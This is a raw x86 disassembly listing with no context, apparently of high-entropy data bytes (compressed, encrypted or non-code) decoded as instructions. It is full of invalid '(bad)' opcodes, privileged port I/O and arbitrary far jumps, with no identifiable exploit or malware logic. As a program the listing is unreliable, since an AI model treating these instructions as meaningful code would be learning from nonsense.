  42dd92:	imul   ebp,DWORD PTR [edi-0x36],0x6b
  42dd96:	or     DWORD PTR [edx+ebp*2+0x12],ebp
  42dd9a:	outs   dx,BYTE PTR ds:[esi]
  42dd9b:	(bad)  
  42dd9d:	push   0xffffffa9
  42dd9f:	xor    ax,0xe357
  42dda3:	jae    0x42dd2c
  42dda5:	lods   al,BYTE PTR ds:[esi]
  42dda6:	dec    esi
  42dda7:	repnz and al,0x71
  42ddaa:	loop   0x42dd7d
  42ddac:	pusha  
  42ddad:	jno    0x42ddff
  42ddaf:	jo     0x42de28
  42ddb1:	xchg   edx,eax
  42ddb2:	cld    
  42ddb3:	inc    ebp
  42ddb4:	enter  0xf1c1,0xf8
  42ddb8:	dec    ebx
  42ddb9:	std    
  42ddba:	xchg   ecx,eax
  42ddbb:	mov    edx,0x689a2f65
  42ddc0:	dec    eax
  42ddc1:	mov    dl,0xcb
  42ddc3:	push   esi
  42ddc4:	mov    dh,0xaa
  42ddc6:	pop    eax
  42ddc7:	bound  esi,QWORD PTR [edx]
  42ddc9:	loope  0x42dd4b
  42ddcb:	ret    
  42ddcc:	mov    al,al
  42ddce:	xchg   DWORD PTR [edi],esp
  42ddd0:	inc    esi
  42ddd1:	xor    bh,BYTE PTR [edx-0xab516b0]
  42ddd7:	adc    eax,0xfb065eca
  42dddc:	mov    edx,0x752858ca
  42dde1:	jl     0x42dde0
  42dde3:	or     ecx,DWORD PTR [ecx]
  42dde5:	mov    eax,DWORD PTR ds:[edx+0x77]
  42dde9:	fldenv [edi-0x52]
  42ddec:	out    dx,eax
  42dded:	cli    
  42ddee:	sbb    al,0x88
  42ddf0:	jmp    0x1108:0x9ebae22c
  42ddf7:	mov    esp,0x7940e201
  42ddfc:	mov    dh,0xad
  42ddfe:	inc    ebx
  42ddff:	lea    esi,[eax+0x792d121b]
  42de05:	pop    edx
  42de06:	lods   eax,DWORD PTR ds:[esi]
  42de07:	jp     0x42ddee
  42de09:	loopne 0x42dde8
  42de0b:	stos   DWORD PTR es:[edi],eax
  42de0c:	sub    BYTE PTR [ebx-0x88993fc],cl
  42de12:	or     eax,0x82da4e17
  42de17:	adc    BYTE PTR [ebx+esi*4],dh
  42de1a:	adc    DWORD PTR [edi+0x4f],0x48
  42de1e:	imul   ebp,DWORD PTR [edi],0xffffffed
  42de21:	mov    WORD PTR [edx-0x3ba9a527],?
  42de27:	mov    bh,0x66
  42de29:	jmp    0x30641269
  42de2e:	ror    BYTE PTR es:[esi],1
  42de31:	dec    ebp
  42de32:	and    al,al
  42de34:	jle    0x42de73
  42de36:	das    
  42de37:	sqrtps xmm0,XMMWORD PTR [ebx]
  42de3a:	int    0x1b
  42de3c:	int    0xa2
  42de3e:	adc    al,0xa
  42de40:	dec    ebp
  42de41:	mov    BYTE PTR [eax],al
	...
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi+0x39ae2a0c]
  42dec3:	dec    esi
  42dec4:	push   ds
  42dec5:	out    0x1,al
  42dec7:	add    dh,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR ds:0xca360da3,bl
  42ded1:	xchg   ecx,eax
  42ded2:	jae    0x42df33
  42ded4:	xchg   edi,eax
  42ded5:	popa   
  42ded6:	retf   
  42ded7:	mov    bl,cl
  42ded9:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dedb:	xor    DWORD PTR [eax+ebp*8-0x676d91d7],0x612cca4d
  42dee6:	jmp    0x9f6216be
  42deeb:	pop    eax
  42deec:	mov    bh,0x7
  42deee:	imul   esp,DWORD PTR [esi],0x13462b7a
  42def4:	cwde   
  42def5:	jle    0x42dec1
  42def7:	dec    eax
  42def8:	push   ebx
  42def9:	xchg   ebp,esp
  42defb:	add    eax,0x3e962f46
  42df00:	je     0x42df52
  42df02:	cdq    
  42df03:	sti    
  42df04:	scas   eax,DWORD PTR es:[edi]
  42df05:	in     al,0xc8
  42df07:	xchg   BYTE PTR [esi],bh
  42df09:	ret    0x8b46
  42df0c:	loop   0x42dec1
  42df0e:	mov    ch,0xd7
  42df10:	stos   DWORD PTR es:[edi],eax
  42df11:	jbe    0x42df0f
  42df13:	out    0x10,eax
  42df15:	clc    
  42df16:	sahf   
  42df17:	or     BYTE PTR [ebx-0x55235be4],dl
  42df1d:	add    DWORD PTR [esi],edi
  42df1f:	inc    esp
  42df20:	and    BYTE PTR [edx+0x9],al
  42df23:	xchg   esi,eax
  42df24:	dec    ebp
  42df25:	test   DWORD PTR [esp+esi*2+0x40],esp
  42df29:	mov    ?,ebx
  42df2b:	xor    DWORD PTR [eax+eiz*1],0xb6bbd642
  42df32:	sub    al,0xd2
  42df34:	test   DWORD PTR [esi+0xbeab6ea],esp
  42df3a:	adc    ah,0x5d
  42df3d:	adc    ecx,DWORD PTR [edi+ebx*2]
  42df40:	cmp    edi,DWORD PTR [edi+0x42]
  42df43:	adc    ecx,ecx
  42df45:	xor    BYTE PTR [esi+0x4f5e356],ah
  42df4b:	out    0xab,al
  42df4d:	jo     0x42dfb6
  42df4f:	popf   
  42df50:	lock cmp dh,dh
  42df53:	xchg   BYTE PTR [si],bl
  42df56:	jmp    0x80ecf1b
  42df5b:	sahf   
  42df5c:	mov    al,0xa7
  42df5e:	push   0xffffffde
  42df60:	ss or  ebp,ebx
  42df63:	call   0x9b3471c2
  42df68:	outs   dx,DWORD PTR ds:[esi]
  42df69:	js     0x42df70
  42df6b:	push   esi
  42df6c:	or     al,0x3f
  42df6e:	mov    dl,0x44
  42df70:	dec    ebx
  42df71:	inc    ebx
  42df72:	jp     0x42df73
  42df74:	add    BYTE PTR [edx],ah
  42df76:	sub    eax,0x80a2564e
  42df7b:	jg     0x42dff9
  42df7d:	into   
  42df7e:	cld    
  42df7f:	mov    edx,0xb998615d
  42df84:	inc    ebx
  42df85:	mov    WORD PTR [edx-0x6b9bebee],cs
  42df8b:	call   0x93debd01
  42df90:	or     al,0x2d
  42df92:	data16 jp 0x42df8d
  42df95:	fild   DWORD PTR [esp+edi*2]
  42df98:	inc    edx
  42df99:	(bad)  
  42df9a:	dec    DWORD PTR [edx+0xfe42086]
  42dfa0:	sub    esp,DWORD PTR [eax-0xf6bd7fc]
  42dfa6:	loope  0x42e018
  42dfa8:	retf   
  42dfa9:	or     DWORD PTR [edi+0x72],0x52
  42dfad:	test   al,0x31
  42dfaf:	bound  ebx,QWORD PTR [ebx+0x44]
  42dfb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfb3:	pop    esi
  42dfb4:	mov    ebp,0xbe82f47b
  42dfb9:	xor    BYTE PTR [esi+0x7a],ch
  42dfbc:	mov    DWORD PTR [ebp+0x78ad5a18],eax
	...
  42e032:	add    BYTE PTR [eax],al
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx+0x9bb4ce2],0x73
  42e044:	adc    al,0xe7
  42e046:	add    DWORD PTR [eax],eax
  42e048:	test   BYTE PTR [eax],0x0
  42e04b:	add    bh,cl
  42e04d:	in     eax,dx
  42e04e:	xor    eax,0xcdd99c3d
  42e053:	sahf   
  42e054:	shl    BYTE PTR [esi],1
  42e056:	sbb    bl,ch
  42e058:	bound  ebp,QWORD PTR [esi+0x65aa606a]
  42e05e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e060:	xchg   edx,eax
  42e061:	lods   eax,DWORD PTR ds:[esi]
  42e062:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42e064:	gs sbb al,0x3f
  42e067:	xchg   ecx,eax
  42e068:	loope  0x42e084
  42e06a:	xchg   esp,eax
  42e06b:	les    ebx,FWORD PTR [edx]
  42e06d:	rol    BYTE PTR [ebp+0x74],0xa3
  42e071:	and    eax,0x19fcd61f
  42e076:	inc    esp
  42e077:	inc    ecx
  42e078:	adc    BYTE PTR [esi-0x78f8e7c],ch
  42e07e:	(bad)
  42e081:	stos   DWORD PTR es:[edi],eax
  42e082:	adc    BYTE PTR [ebp+edx*1-0xe36a7b6],ah
  42e089:	jg     0x42e038
  42e08b:	popa   
  42e08c:	sub    eax,DWORD PTR [eax-0x564b40f8]
  42e092:	arpl   si,cx
  42e094:	dec    eax
  42e095:	push   ds
  42e096:	xchg   esp,eax
  42e097:	fld    QWORD PTR [ecx-0x2dd5fd3f]
  42e09d:	sub    DWORD PTR [ebx-0x5f],ebx
  42e0a0:	ja     0x42e0c5
  42e0a2:	adc    BYTE PTR [eax+ebp*2],ah
  42e0a5:	pop    eax
  42e0a6:	js     0x42e0e4
  42e0a8:	xor    eax,0x8c4b243
  42e0ad:	add    edx,edx
  42e0af:	adc    al,0xfc
  42e0b1:	hlt    
  42e0b2:	imul   ebx,DWORD PTR [edx],0x65
  42e0b5:	stos   DWORD PTR es:[edi],eax
  42e0b6:	adc    DWORD PTR [edi],0x15a34a95
  42e0bc:	test   BYTE PTR [ecx+0x7ecba9bb],bh
  42e0c2:	adc    eax,0x83c86614
  42e0c7:	xchg   ecx,eax
  42e0c8:	cmp    eax,0xbb9f99d2
  42e0cd:	es sub al,0xba
  42e0d0:	inc    ebp
  42e0d1:	pop    ss
  42e0d2:	out    dx,eax
  42e0d3:	mov    esi,cs
  42e0d5:	addr16 adc dl,bl
  42e0d8:	or     eax,0xe144c4f1
  42e0dd:	dec    esp
  42e0de:	pop    esp
  42e0df:	ins    BYTE PTR es:[edi],dx
  42e0e0:	in     eax,dx
  42e0e1:	(bad)  
  42e0e2:	jne    0x42e158
  42e0e4:	xchg   BYTE PTR [ecx-0x75a35a0b],dl
  42e0ea:	mov    es,WORD PTR [ecx*2-0x666e9bf]
  42e0f1:	push   ebp
  42e0f2:	xchg   DWORD PTR [esi-0x5c5f1080],edi
  42e0f8:	add    eax,0x62765844
  42e0fd:	retf   
  42e0fe:	xor    eax,0xd87eee4c
  42e103:	aad    0x61
  42e105:	mov    edx,0x9a20d290
  42e10a:	sub    eax,0x4a25872
  42e10f:	mov    ebp,0xcea4530d
  42e114:	adc    dh,BYTE PTR [ecx-0x1c]
  42e117:	push   ebx
  42e118:	nop
  42e119:	call   0xef33:0x7b59b705
  42e120:	fisubr DWORD PTR [ebx-0x34]
  42e123:	push   ebp
  42e124:	add    eax,0x51541611
  42e129:	in     eax,dx
  42e12a:	call   0x8901c293
  42e12f:	pop    ecx
  42e130:	fisubr DWORD PTR [ebx+0x2b82163c]
  42e136:	in     eax,dx
  42e137:	adc    ch,BYTE PTR [ebx-0x22c8e115]
  42e13d:	adc    BYTE PTR [ebx+eiz*8+0xdfe9],bh
	...
  42e1b4:	lea    ecx,[eax]
  42e1b6:	pop    ebp
  42e1b7:	jbe    0x42e196
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0xd7a95471
  42e1c3:	push   0xa
  42e1c5:	call   0x138e1cb
  42e1ca:	add    BYTE PTR [eax],al
  42e1cc:	xchg   esi,eax
  42e1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1ce:	add    edx,ebp
  42e1d0:	push   esi
  42e1d1:	ret    
  42e1d2:	and    DWORD PTR [ebx],esi
  42e1d4:	mov    ds:0x53612f0f,eax
  42e1d9:	push   cs
  42e1da:	shl    DWORD PTR [ecx],cl
  42e1dc:	xchg   BYTE PTR [ebp+0x40],al
  42e1df:	xchg   ebx,eax
  42e1e0:	iret   
  42e1e1:	aam    0x44
  42e1e3:	in     al,0x49
  42e1e5:	out    dx,eax
  42e1e6:	xchg   edx,eax
  42e1e7:	loop   0x42e1b1
  42e1e9:	stos   BYTE PTR es:[edi],al
  42e1ea:	or     al,0x80
  42e1ec:	or     cl,dh
  42e1ee:	fld    TBYTE PTR [eax-0x3a]
  42e1f1:	sub    DWORD PTR [ebp+0x4f3f3452],ecx
  42e1f7:	shl    BYTE PTR ds:0x1d93e949,cl
  42e1fd:	mov    WORD PTR [edx+ecx*1],ss
  42e200:	out    0xf,al
  42e202:	push   ss
  42e203:	in     al,dx
  42e204:	out    dx,eax
  42e205:	es call 0x270e00f2
  42e20b:	dec    ebp
  42e20c:	and    BYTE PTR [eax],ch
  42e20e:	std    
  42e20f:	or     BYTE PTR [ebx-0x7dcc13ad],dl
  42e215:	das    
  42e216:	xchg   ecx,eax
  42e217:	xchg   ebx,eax
  42e218:	lds    eax,FWORD PTR [eax+0x21e3f90a]
  42e21e:	sbb    eax,0xc56e81f4
  42e223:	adc    eax,0x99d35891
  42e228:	or     BYTE PTR [edx+eiz*1-0x30],al
  42e22c:	(bad)  
  42e22d:	retf   0x9346
  42e230:	push   eax
  42e231:	je     0x42e2a7
  42e233:	pop    esi
  42e234:	mov    esp,0x1a473e9a
  42e239:	ins    BYTE PTR es:[edi],dx
  42e23a:	push   ss
  42e23b:	jge    0x42e234
  42e23d:	mov    edx,0x5f645ad1
  42e242:	inc    edx
  42e243:	(bad)  
  42e244:	push   esi
  42e245:	jb     0x42e2a6
  42e247:	cmp    eax,0xb05339c4
  42e24c:	(bad)  
  42e24d:	in     al,0x4d
  42e24f:	mov    DWORD PTR [edi+ebx*4-0x75],edi
  42e253:	fisub  WORD PTR [ebp-0x4d0a73b7]
  42e259:	ret    
  42e25a:	popf   
  42e25b:	jno    0x42e28a
  42e25d:	(bad)  
  42e25e:	jecxz  0x42e231
  42e260:	arpl   WORD PTR [ebp-0x4f1a34e5],sp
  42e266:	cmp    ebx,DWORD PTR [esi]
  42e268:	mov    ds:0xa54a2e2a,al
  42e26d:	sub    DWORD PTR [eax-0x3d5630fd],esp
  42e273:	cmp    BYTE PTR [ebp+0x0],0x80
  42e277:	in     al,dx
  42e278:	(bad)
  42e27b:	xor    BYTE PTR [ebx+ebx*2-0x6118c425],bh
  42e282:	in     al,0x84
  42e284:	xlat   BYTE PTR ds:[ebx]
  42e285:	dec    esp
  42e286:	(bad)  
  42e287:	jns    0x42e252
  42e289:	and    ah,BYTE PTR [ecx]
  42e28b:	ja     0x42e304
  42e28d:	fistp  DWORD PTR ds:0x52a3458e
  42e293:	js     0x42e28f
  42e295:	dec    edx
  42e296:	test   eax,0x71446107
  42e29b:	out    0xbc,al
  42e29d:	add    eax,0x9d28a41c
  42e2a2:	punpckhdq mm6,mm2
  42e2a5:	enter  0xd6c0,0x9e
  42e2a9:	adc    eax,0x6f0e0624
  42e2ae:	cmp    ah,BYTE PTR [eax+0x64]
  42e2b1:	and    bh,cl
  42e2b3:	mov    BYTE PTR [edi-0x20],dl
  42e2b6:	inc    ebx
  42e2b7:	xchg   DWORD PTR [eax-0x590df21d],ecx
  42e2bd:	inc    esp
  42e2be:	dec    esp
  42e2bf:	dec    esi
  42e2c0:	icebp  
  42e2c1:	mov    ch,0x0
	...
  42e333:	add    cl,al
  42e335:	into   
  42e336:	arpl   WORD PTR [ecx-0x21044291],bx
  42e33c:	inc    esi
  42e33d:	push   ecx
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [ebx],ecx
  42e341:	retf   0xcf4e
  42e344:	add    cl,ch
  42e346:	add    DWORD PTR [eax],eax
  42e348:	test   BYTE PTR [eax],0x0
  42e34b:	add    BYTE PTR [eax-0x392416e8],dh
  42e351:	in     eax,dx
  42e352:	xor    esi,esi
  42e354:	push   0xb5753b20
  42e359:	cld    
  42e35a:	jecxz  0x42e337
  42e35c:	add    DWORD PTR [eax],ecx
  42e35e:	jmp    0x2a39:0xe9a213ef
  42e365:	xchg   ebx,eax
  42e366:	(bad)  
  42e367:	dec    eax
  42e368:	mov    ebp,0x907d2f77
  42e36d:	jmp    0x42e30f
  42e36f:	inc    ebp
  42e370:	jge    0x42e3ad
  42e372:	repnz pop edx
  42e374:	(bad)  
  42e375:	pop    ecx
  42e376:	sub    al,BYTE PTR [eax-0x230576c1]
  42e37c:	and    al,0x50
  42e37e:	mov    eax,0x93f89c30
  42e383:	mov    edi,0xac3da8e
  42e388:	shl    BYTE PTR [edx+0x1a8eb4de],1
  42e38e:	dec    eax
  42e38f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42e391:	test   BYTE PTR [ebp-0x23a6f1d2],bl
  42e397:	add    eax,0x12ec3e7d
  42e39c:	push   edi
  42e39d:	jno    0x42e368
  42e39f:	mov    esp,0x3af61313
  42e3a4:	in     eax,0x89
  42e3a6:	ds jge 0x42e391
  42e3a9:	add    al,0x4d
  42e3ab:	push   esp
  42e3ac:	mov    WORD PTR [eax],ds
  42e3ae:	add    al,0x93
  42e3b0:	out    0xca,al
  42e3b2:	pop    esi
  42e3b3:	pusha  
  42e3b4:	cmp    DWORD PTR [ebx+0x3b],ebp
  42e3b7:	inc    ecx
  42e3b8:	or     BYTE PTR [esi],cl
  42e3ba:	repnz out 0x1f,eax
  42e3bd:	mov    bh,0x63
  42e3bf:	aad    0x49
  42e3c1:	add    BYTE PTR [ebx],bh
  42e3c3:	out    dx,al
  42e3c4:	rcl    DWORD PTR [eax+0x58],cl
  42e3c7:	and    DWORD PTR [esi],ebp
  42e3c9:	imul   ebx,DWORD PTR [esi],0x21
  42e3cc:	push   eax
  42e3cd:	ret    
  42e3ce:	push   edi
  42e3cf:	mov    ds:0xf396c95f,eax
  42e3d4:	jmp    0x1036:0x4e315b3f
  42e3db:	mov    bh,0xa4
  42e3dd:	leave  
  42e3de:	pop    esp
  42e3df:	push   ecx
  42e3e0:	mov    ebx,0x76b1b540
  42e3e5:	or     al,dl
  42e3e7:	adc    BYTE PTR [esi+ecx*1-0x7f],bh
  42e3eb:	and    al,0x67
  42e3ed:	shl    DWORD PTR [edi],0x6c
  42e3f0:	push   edi
  42e3f1:	pop    esp
  42e3f2:	push   edi
  42e3f3:	xor    ebx,edi
  42e3f5:	cmp    BYTE PTR [ebp+eiz*1-0xa51d20c],dh
  42e3fc:	aam    0xc9
  42e3fe:	les    esi,FWORD PTR [ebp-0x7]
  42e401:	dec    eax
  42e402:	fistp  QWORD PTR fs:[eax+0x4800fe30]
  42e409:	mov    dh,0x95
  42e40b:	loope  0x42e3e4
  42e40d:	push   es
  42e40e:	aaa    
  42e40f:	cmc    
  42e410:	mov    al,0xe3
  42e412:	scas   al,BYTE PTR es:[edi]
  42e413:	mov    bl,0xa6
  42e415:	and    ebx,DWORD PTR [edx+esi*2-0x674b322c]
  42e41c:	sbb    al,0x7f
  42e41e:	cwde   
  42e41f:	daa    
  42e420:	mov    eax,ds:0xa0d92d6d
  42e425:	jnp    0x42e497
  42e427:	pop    ecx
  42e428:	loope  0x42e3f1
  42e42a:	retf   0x36f6
  42e42d:	xchg   esi,eax
  42e42e:	push   es
  42e42f:	jl     0x42e405
  42e431:	sub    esi,DWORD PTR ss:[ecx+0x23]
  42e435:	jp     0x42e3f7
  42e437:	retf   
  42e438:	xor    DWORD PTR [esi-0x12584dee],ebp
  42e43e:	add    edx,eax
  42e440:	(bad)  
  42e441:	mov    ebp,0x0
	...
  42e4b2:	add    BYTE PTR [eax],al
  42e4b4:	cdq    
  42e4b5:	cmc    
  42e4b6:	adc    BYTE PTR [ebx-0x12],0x77
  42e4ba:	fcos   
  42e4bc:	pavgw  mm4,mm3
  42e4bf:	mov    esp,0x27eba9ff
  42e4c4:	imul   cl
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	test   BYTE PTR [eax],0x0
  42e4cb:	add    bh,al
  42e4cd:	or     DWORD PTR [edi+0x4a],esi
  42e4d0:	push   eax
  42e4d1:	js     0x42e541
  42e4d3:	cmp    eax,0xc368dd63
  42e4d8:	test   DWORD PTR [ebx+eiz*4-0x3a79d395],0x2a5fcd31
  42e4e3:	adc    al,0xcf
  42e4e5:	popa   
  42e4e6:	fidiv  WORD PTR [ebp+0x53]
  42e4e9:	xchg   esi,eax
  42e4ea:	jg     0x42e529
  42e4ec:	das    
  42e4ed:	mov    edi,0x162cf55d
  42e4f2:	fs pop esi
  42e4f4:	pop    ecx
  42e4f5:	and    edx,DWORD PTR [edx]
  42e4f7:	adc    bh,BYTE PTR [esi-0x46]
  42e4fa:	fwait
  42e4fb:	enter  0xb0dd,0x2a
  42e4ff:	adc    DWORD PTR [edi-0x39],edi
  42e502:	inc    ebx
  42e503:	shl    BYTE PTR [edi],0xf
  42e506:	stc    
  42e507:	mov    esi,0xa4e602e6
  42e50c:	repz and cl,BYTE PTR [eax]
  42e50f:	push   ecx
  42e510:	pushf  
  42e511:	or     BYTE PTR [ebx-0x4ed043f0],cl
  42e517:	adc    eax,esi
  42e519:	ret    
  42e51a:	in     al,dx
  42e51b:	cdq    
  42e51c:	aam    0xbb
  42e51e:	(bad)
  42e521:	popa   
  42e522:	push   es
  42e523:	jmp    0x42e4f5
  42e525:	jmp    0x42e4cc
  42e527:	and    ebx,edi
  42e529:	repnz add BYTE PTR [ecx],ah
  42e52c:	test   esp,ebx
  42e52e:	xchg   edx,eax
  42e52f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42e531:	mov    edx,0x9b625f0a
  42e536:	imul   ebp,DWORD PTR [esi-0x71],0xffffffcf
  42e53a:	cs push ebp
  42e53c:	adc    dl,ch
  42e53e:	mov    esp,0x15ef82b9
  42e543:	or     eax,0x44e81422
  42e548:	lods   al,BYTE PTR ds:[esi]
  42e549:	stos   BYTE PTR es:[edi],al
  42e54a:	push   esi
  42e54b:	ret    0x25b2
  42e54e:	xchg   esp,eax
  42e54f:	mov    ds:0xe2b72257,eax
  42e554:	sub    dh,al
  42e556:	push   0xcc7c1a80
  42e55b:	repz or al,0xa
  42e55e:	(bad)  [edx+0x16d8b9d5]
  42e564:	js     0x42e511
  42e566:	call   0x3221:0xdd49f727
  42e56d:	fnstsw WORD PTR [edi*8+0x131011a]
  42e574:	inc    esi
  42e575:	xchg   BYTE PTR [edx+0x58cf2402],bh
  42e57b:	mov    ah,0xa5
  42e57d:	arpl   WORD PTR [ecx],sp
  42e57f:	lods   al,BYTE PTR ds:[esi]
  42e580:	pop    ecx
  42e581:	les    eax,FWORD PTR [esi-0x7b]
  42e584:	pop    es
  42e585:	(bad)  
  42e586:	and    eax,0xf40e9cd4
  42e58b:	inc    BYTE PTR [ebp+0x6b3ef9f4]
  42e591:	fiadd  DWORD PTR [eax+0x34]
  42e594:	jle    0x42e587
  42e596:	xchg   ecx,eax
  42e597:	inc    ebx
  42e598:	sbb    DWORD PTR [edi-0x458776b8],esi
  42e59e:	xor    ah,BYTE PTR [edi+0x76b3c3da]
  42e5a4:	test   al,0x9b
  42e5a6:	xor    eax,0x7f35e5b6
  42e5ab:	sbb    ah,BYTE PTR [edi-0x1b]
  42e5ae:	mov    esi,0xe29b7a6f
  42e5b3:	sahf   
  42e5b4:	addr16 sahf 
  42e5b6:	pusha  
  42e5b7:	leave  
  42e5b8:	xor    edi,esi
  42e5ba:	fwait
  42e5bb:	sub    bh,bh
  42e5bd:	loop   0x42e5d4
  42e5bf:	arpl   WORD PTR [eax-0x6f],dx
	...
  42e632:	add    BYTE PTR [eax],al
  42e634:	repz add esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	cmp    bl,BYTE PTR [edx-0x15136766]
  42e646:	add    DWORD PTR [eax],eax
  42e648:	test   BYTE PTR [eax],0x0
  42e64b:	add    BYTE PTR [edi-0x1f],ah
  42e64e:	mov    si,0x7d25
  42e652:	adc    ch,BYTE PTR [ebx-0x30e3dd01]
  42e658:	inc    esp
  42e659:	outs   dx,DWORD PTR ds:[esi]
  42e65a:	push   ss
  42e65b:	std    
  42e65c:	cwde   
  42e65d:	push   es
  42e65e:	sbb    al,0x63
  42e660:	push   0x393f33f
  42e665:	loop   0x42e615
  42e667:	xor    eax,0xf8924718
  42e66c:	sub    cl,BYTE PTR [ebx]
  42e66e:	sahf   
  42e66f:	cs sbb eax,0x41c5204c
  42e675:	or     cl,BYTE PTR [ebp-0x4cf19e65]
  42e67b:	loope  0x42e68a
  42e67d:	jb     0x42e673
  42e67f:	mov    ds:0x4b26ccb9,eax
  42e684:	xor    BYTE PTR [edi],ch
  42e686:	mov    eax,0xfd858275
  42e68b:	dec    esi
  42e68c:	sbb    bl,dh
  42e68e:	add    BYTE PTR [esi],al
  42e690:	pop    ebx
  42e691:	mov    dh,0xa8
  42e693:	mov    edi,0x6b2cc39a
  42e698:	retf   0xe0d5
  42e69b:	sbb    bl,0x78
  42e69e:	xchg   edx,eax
  42e69f:	jp     0x42e654
  42e6a1:	adc    BYTE PTR [ecx],ch
  42e6a3:	jnp    0x42e69a
  42e6a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6a6:	xchg   ebp,eax
  42e6a7:	inc    esp
  42e6a8:	retf   
  42e6a9:	scas   al,BYTE PTR es:[edi]
  42e6aa:	es aam 0xaa
  42e6ad:	fisub  DWORD PTR [edi]
  42e6af:	add    BYTE PTR [ebx-0x3eb2c8ee],ch
  42e6b5:	nop
  42e6b6:	push   edi
  42e6b7:	sub    ebp,DWORD PTR [esi-0x32]
  42e6ba:	mov    esp,0x2d5e3755
  42e6bf:	sbb    DWORD PTR [edi],esi
  42e6c1:	xchg   esi,eax
  42e6c2:	in     eax,dx
  42e6c3:	pop    esi
  42e6c4:	jb     0x42e6a1
  42e6c6:	inc    ecx
  42e6c7:	cmp    edx,DWORD PTR [esp+eax*4]
  42e6ca:	jns    0x42e665
  42e6cc:	sar    dl,0x17
  42e6cf:	lods   eax,DWORD PTR ds:[esi]
  42e6d0:	leave  
  42e6d1:	xchg   eax,ebp
  42e6d3:	xor    BYTE PTR [esi+eiz*8+0x1],bl
  42e6d7:	mov    ecx,0x390c11fa
  42e6dc:	(bad)  
  42e6dd:	retf   
  42e6de:	out    dx,al
  42e6df:	inc    ecx
  42e6e0:	cmp    eax,0xf489df64
  42e6e5:	popf   
  42e6e6:	cdq    
  42e6e7:	dec    esp
  42e6e8:	jmp    0x70df3b5c
  42e6ed:	or     al,0xc7
  42e6ef:	shl    BYTE PTR [ebp+0x1d2c94a5],1
  42e6f5:	lods   al,BYTE PTR ds:[esi]
  42e6f6:	inc    BYTE PTR [eax-0x43]
  42e6f9:	jnp    0x42e6ae
  42e6fb:	inc    edx
  42e6fc:	adc    al,0x86
  42e6fe:	enter  0xaa55,0x6f
  42e702:	std    
  42e703:	or     al,0x5e
  42e705:	xlat   BYTE PTR ds:[ebx]
  42e706:	pop    edi
  42e707:	and    ch,ch
  42e709:	mov    BYTE PTR [edx],bl
  42e70b:	neg    BYTE PTR [ebp-0x49fd2c3e]
  42e711:	in     al,0x61
  42e713:	inc    esp
  42e714:	fld    QWORD PTR [edx+ebp*8]
  42e717:	mov    WORD PTR [edx],?
  42e719:	sbb    eax,0xf44a1c11
  42e71e:	iret   
  42e71f:	cmp    al,0xe8
  42e721:	out    0x74,eax
  42e723:	mov    al,ds:0x62d710af
  42e728:	xchg   edx,eax
  42e729:	xchg   esp,eax
  42e72a:	in     al,dx
  42e72b:	(bad)
  42e730:	lahf   
  42e731:	jno    0x42e772
  42e733:	xor    al,0x44
  42e735:	pusha  
  42e736:	jo     0x42e6e1
  42e738:	inc    edi
  42e739:	enter  0x2138,0x66
  42e73d:	jb     0x42e743
  42e73f:	add    DWORD PTR [edi+esi*8+0x0],edi
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi-0x17f2aa8a]
  42e7c1:	loopne 0x42e758
  42e7c3:	cld    
  42e7c4:	loop   0x42e7b1
  42e7c6:	add    DWORD PTR [eax],eax
  42e7c8:	test   BYTE PTR [eax],0x0
  42e7cb:	add    al,ch
  42e7cd:	aaa    
  42e7ce:	xor    eax,0x3f19cb75
  42e7d3:	jge    0x42e768
  42e7d5:	push   es
  42e7d6:	jno    0x42e78a
  42e7d8:	cmp    cl,dh
  42e7da:	push   eax
  42e7db:	mov    BYTE PTR [edx+0x6e7cd174],bh
  42e7e1:	sar    DWORD PTR [edx],1
  42e7e3:	in     al,dx
  42e7e4:	sahf   
  42e7e5:	xor    eax,0x79c0cc2c
  42e7ea:	jmp    0x38d8:0x87b4ee59
  42e7f1:	cmc    
  42e7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e7f3:	aas    
  42e7f4:	jmp    0x5e23:0x7353c054
  42e7fb:	loop   0x42e7b7
  42e7fd:	scas   al,BYTE PTR es:[edi]
  42e7fe:	popa   
  42e7ff:	sub    ebp,0xffffffbe
  42e802:	(bad)  [eax]
  42e804:	mov    ds:0xec3288b8,al
  42e809:	sub    dh,BYTE PTR [esi+0x17]
  42e80c:	inc    esi
  42e80d:	jb     0x42e830
  42e80f:	or     DWORD PTR [esi],ebx
  42e811:	jmp    0x42e873
  42e813:	test   al,0x1b
  42e815:	das    
  42e816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e817:	out    0x25,eax
  42e819:	jns    0x42e867
  42e81b:	sahf   
  42e81c:	loopne 0x42e828
  42e81e:	or     bh,cl
  42e820:	sub    eax,0x5a99158
  42e825:	retf   0xd6f3
  42e828:	fild   DWORD PTR [edi+0x3256bf65]
